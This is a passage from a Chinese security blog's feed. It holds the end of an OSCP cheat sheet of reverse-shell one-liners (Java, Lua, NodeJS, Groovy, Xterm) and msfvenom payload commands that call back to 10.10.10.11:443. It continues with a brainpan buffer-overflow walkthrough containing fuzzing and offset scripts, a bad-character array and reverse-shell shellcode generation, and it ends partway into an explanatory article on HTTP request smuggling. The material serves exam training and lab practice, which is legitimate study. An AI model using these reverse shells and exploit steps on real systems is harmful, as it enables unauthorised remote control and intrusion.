po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure><p>创建线程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Thread thread = new Thread()&#123;</span><br><span class="line">    public void run()&#123;</span><br><span class="line">        // Reverse shell here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">thread.start();</span><br></pre></td></tr></table></figure><h2 id="16、生成War文件反弹shell"><a href="#16、生成War文件反弹shell" class="headerlink" title="16、生成War文件反弹shell"></a><strong>16、生成War文件反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>使用如下命令生成war文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f war &gt; reverse.war</span><br></pre></td></tr></table></figure><p>查看war包中shell的jsp文件名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings reverse.war | grep jsp</span><br></pre></td></tr></table></figure><p>在靶机上部署war包后，访问shell的jsp文件，即可在监听端口获得反弹shell</p><h2 id="17、使用Lua脚本反弹shell"><a href="#17、使用Lua脚本反弹shell" class="headerlink" title="17、使用Lua脚本反弹shell"></a><strong>17、使用Lua脚本反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：Linux平台：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;10.10.10.11&apos;,&apos;443&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure><p>Windows及Linux平台：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua5.1 -e &apos;local host, port = &quot;10.10.10.11&quot;, 443 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&apos;</span><br></pre></td></tr></table></figure><h2 id="18、NodeJS版本反弹shell"><a href="#18、NodeJS版本反弹shell" class="headerlink" title="18、NodeJS版本反弹shell"></a><strong>18、NodeJS版本反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var net = require(&quot;net&quot;),</span><br><span class="line">        cp = require(&quot;child_process&quot;),</span><br><span class="line">        sh = cp.spawn(&quot;/bin/sh&quot;, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(443, &quot;10.10.10.11&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return /a/; </span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(&apos;child_process&apos;).exec(&apos;nc -e /bin/sh 10.10.10.11 443&apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-var x = global.process.mainModule.require</span><br><span class="line">-x(&apos;child_process&apos;).exec(&apos;nc 10.10.10.11 443 -e /bin/bash&apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</span><br></pre></td></tr></table></figure><h2 id="19、Groovy版本反弹shell"><a href="#19、Groovy版本反弹shell" class="headerlink" title="19、Groovy版本反弹shell"></a><strong>19、Groovy版本反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String host=&quot;10.10.10.11&quot;;</span><br><span class="line">int port=443;</span><br><span class="line">String cmd=&quot;cmd.exe&quot;;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure><h2 id="20、生成Meterpreter反弹Shell"><a href="#20、生成Meterpreter反弹Shell" class="headerlink" title="20、生成Meterpreter反弹Shell:"></a><strong>20、生成Meterpreter反弹Shell:</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f war &gt; shell.war</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h2 id="21、使用Xterm反弹shell"><a href="#21、使用Xterm反弹shell" class="headerlink" title="21、使用Xterm反弹shell"></a><strong>21、使用Xterm反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xterm -display 10.10.10.11:1</span><br><span class="line">Xnest :1</span><br><span class="line">xhost +targetip</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OSCP备忘录&quot;&gt;&lt;a href=&quot;#OSCP备忘录&quot; class=&quot;headerlink&quot; title=&quot;OSCP备忘录&quot;&gt;&lt;/a&gt;OSCP备忘录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;参考链接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;https://github.c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>OSCP-Buffer Overflows brainpan</title>
    <link href="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/"/>
    <id>https://vuln.top/2020/07/14/OSCP Buffer Overflows brainpan 473f8d6971d444c2a219b3ce9b976cd9/</id>
    <published>2020-07-13T21:12:40.000Z</published>
    <updated>2020-07-14T05:30:57.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OSCP-Buffer-Overflows-brainpan"><a href="#OSCP-Buffer-Overflows-brainpan" class="headerlink" title="OSCP-Buffer Overflows brainpan"></a>OSCP-Buffer Overflows brainpan</h1><p><a href="https://github.com/freddiebarrsmith/Buffer-Overflow-Exploit-Development-Practice/tree/master/brainpan" target="_blank" rel="noopener">https://github.com/freddiebarrsmith/Buffer-Overflow-Exploit-Development-Practice/tree/master/brainpan</a></p><h2 id="1-判断是否存在缓冲区溢出"><a href="#1-判断是否存在缓冲区溢出" class="headerlink" title="1. 判断是否存在缓冲区溢出"></a>1. 判断是否存在缓冲区溢出</h2><p>通过如下脚本判断是否存在缓冲区溢出点，发送900位时程序崩溃说明存在缓冲区溢出</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"># coding=utf-8</span><br><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">buffer=[<span class="string">"A"</span>]</span><br><span class="line">counter=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer) &lt;= <span class="number">30</span>:</span><br><span class="line">    buffer.append(<span class="string">"A"</span>*counter)</span><br><span class="line">    counter=counter+<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    print <span class="string">"Fuzzing vulnserver with %s bytes"</span> % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    connect=s.connect((<span class="string">'10.3.42.104'</span>,<span class="number">9999</span>))</span><br><span class="line">    #s.send('TRUN /.:/' + string)</span><br><span class="line">    s.send(string)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure><p><img src="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled.png" alt="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled.png"></p><h2 id="2-计算偏移量"><a href="#2-计算偏移量" class="headerlink" title="2. 计算偏移量"></a>2. 计算偏移量</h2><p>通过MSF(/usr/share/metasploit-framework/tools/exploit)生成900位长度的字符串,通过下面脚本发送字符串</p><p><img src="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%201.png" alt="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%201.png"></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">#string = "A"*900</span><br><span class="line">string = <span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"</span></span><br><span class="line">print <span class="string">"Fuzzing vulnserver with %s bytes"</span> % len(string)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'10.3.42.104'</span>,<span class="number">9999</span>))</span><br><span class="line">s.send(string)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>运行脚本后，找到EIP值</p><p><img src="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%202.png" alt="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%202.png"></p><p>通过msf脚本判断offset偏移位为524，<strong>./pattern_offset.rb -q 35724134</strong></p><p><img src="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%203.png" alt="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%203.png"></p><h2 id="3-寻找JMP-ESP地址"><a href="#3-寻找JMP-ESP地址" class="headerlink" title="3. 寻找JMP ESP地址"></a>3. 寻找JMP ESP地址</h2><p>可通过搜索各个进程空间来获取，由于这个程序只有一个exe所有直接搜索，Ctrl+F 寻找jmp esp地址为311712F3</p><p><img src="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%204.png" alt="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%204.png"></p><h2 id="4-检查Bad-Chars"><a href="#4-检查Bad-Chars" class="headerlink" title="4. 检查Bad Chars"></a>4. 检查Bad Chars</h2><p>通过Bad Chars检查是否存在无法执行的char（通常情况下\x00都是bad的所以不需要加入）</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">badchars = (<span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"</span></span><br><span class="line"><span class="string">"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"</span></span><br><span class="line"><span class="string">"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"</span></span><br><span class="line"><span class="string">"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"</span></span><br><span class="line"><span class="string">"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"</span></span><br><span class="line"><span class="string">"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"</span></span><br><span class="line"><span class="string">"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span>)</span><br></pre></td></tr></table></figure><p><img src="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%205.png" alt="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%205.png"></p><p>ESP follow in dump 后观察左下角是否存在缺少的char如果缺少在msf生成shellcode的时候去除掉缺少的char</p><p><img src="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%206.png" alt="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%206.png"></p><h2 id="5-生成SHELLCODE"><a href="#5-生成SHELLCODE" class="headerlink" title="5. 生成SHELLCODE"></a>5. 生成SHELLCODE</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="number">10.3</span><span class="number">.41</span><span class="number">.252</span> LPORT=<span class="number">4444</span> EXITFUNC=thread -f c -a x86 --platform windows -b <span class="string">"\x00"</span></span><br></pre></td></tr></table></figure><p>通过msfvenom生成shellcode，将shellcode加入到EIP后，在shellcode之前放置一些NOP指令,给shellcode预留一些地址</p><p>在shellcode之前插入NOP指令的原因是，现在我们可以将执行流转移到这16个字节内的任何位置。处理器将继续执行NOP指令，直到找到shellcode。我们不需要知道shellcode的确切地址。这可以解决前面提到的不知道buf确切地址的问题。</p><p><img src="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%207.png" alt="https://vuln.top/2020/07/14/OSCP%20Buffer%20Overflows%20brainpan%20473f8d6971d444c2a219b3ce9b976cd9/Untitled%207.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OSCP-Buffer-Overflows-brainpan&quot;&gt;&lt;a href=&quot;#OSCP-Buffer-Overflows-brainpan&quot; class=&quot;headerlink&quot; title=&quot;OSCP-Buffer Overflows brainpan&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HTTP 走私协议</title>
    <link href="https://vuln.top/2020/06/18/HTTP%20f73fc507cac54ad8a67d9e8bbe5f8f04/"/>
    <id>https://vuln.top/2020/06/18/HTTP f73fc507cac54ad8a67d9e8bbe5f8f04/</id>
    <published>2020-06-18T09:42:36.000Z</published>
    <updated>2020-06-18T09:42:36.480Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP-走私协议"><a href="#HTTP-走私协议" class="headerlink" title="HTTP 走私协议"></a>HTTP 走私协议</h1><h1 id="什么是HTTP请求走私"><a href="#什么是HTTP请求走私" class="headerlink" title="什么是HTTP请求走私"></a>什么是HTTP请求走私</h1><blockquote><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p></blockquote><blockquote><p>从HTTP/1.1协议开始，就支持通过一个底层TCP连接或SSL/TLS套接字发送多个HTTP请求。在这种情况下，多个HTTP请求只是简单地连续放在一起，而服务器会通过解析报头来确定每个请求的开始和结束位置。<br>我们的消息的结尾必须与前端发送的请求一致。如果攻击者发送一个语句模糊的请求，就有可能被解析为两个不同的HTTP请求。<br>检测HTTP Requests Smuggling漏洞的首要方法就是发出一个语句模糊的请求，然后再发出一个正常的“受害者”请求，观察能否得到非正常的响应。当然，这非常容易受到干扰，如果另一个用户的请求插在我们两个请求之间，那么他就会中招，而我们观察不到任何异常。这意味着，对于一个实时流量很大的站点，如果不在检验过程中利用大量真实的用户，就很难证明漏洞的存在。即使在其他流量稀少的站点上，也有可能受到连接异常终止的干扰。</p></blockquote><h1 id="发展时间线"><a href="#发展时间线" class="headerlink" title="发展时间线"></a>发展时间线</h1><p>最早在2005年，由Chaim Linhart，Amit Klein，Ronen Heled和Steve Orrin共同完成了一篇关于HTTP Request Smuggling这一攻击方式的报告。通过对整个RFC文档的分析以及丰富的实例，证明了这一攻击方式的危害性。</p><blockquote><p><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></p></blockquote><p>在2016年的DEFCON 24 上，@regilero在他的议题——Hiding Wookiees in HTTP中对前面报告中的攻击方式进行了丰富和扩充。</p><blockquote><p><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf" target="_blank" rel="noopener">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf</a></p></blockquote><p>在2019年的BlackHat USA 2019上，PortSwigger的James Kettle在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door中针对当前的网络环境，展示了使用分块编码来进行攻击的攻击方式，扩展了攻击面，并且提出了完整的一套检测利用流程。</p><blockquote><p><a href="https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153" target="_blank" rel="noopener">https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153</a></p></blockquote><h1 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h1><p>HTTP请求走私这一攻击方式很特殊，它不像其他的Web攻击方式那样比较直观，它更多的是在复杂网络环境下，不同的服务器对RFC标准实现的方式不同，程度不同。这样一来，对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就产生了了安全风险。</p><p>在进行后续的学习研究前，我们先来认识一下如今使用最为广泛的<code>HTTP 1.1</code>的协议特性——<code>Keep-Alive&amp;Pipeline</code>。</p><p>在<code>HTTP1.0</code>之前的协议设计中，客户端每进行一次HTTP请求，就需要同服务器建立一个TCP链接。而现代的Web网站页面是由多种资源组成的，我们要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种各样的资源，这样如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p><p>所谓<code>Keep-Alive</code>，就是在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在<code>HTTP1.1</code>中是默认开启的。</p><p>有了<code>Keep-Alive</code>之后，后续就有了<code>Pipeline</code>，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p><p>现如今，浏览器默认是不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。</p><p>为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构。</p><p><img src="https://vuln.top/2020/06/18/HTTP%20f73fc507cac54ad8a67d9e8bbe5f8f04/Untitled.png" 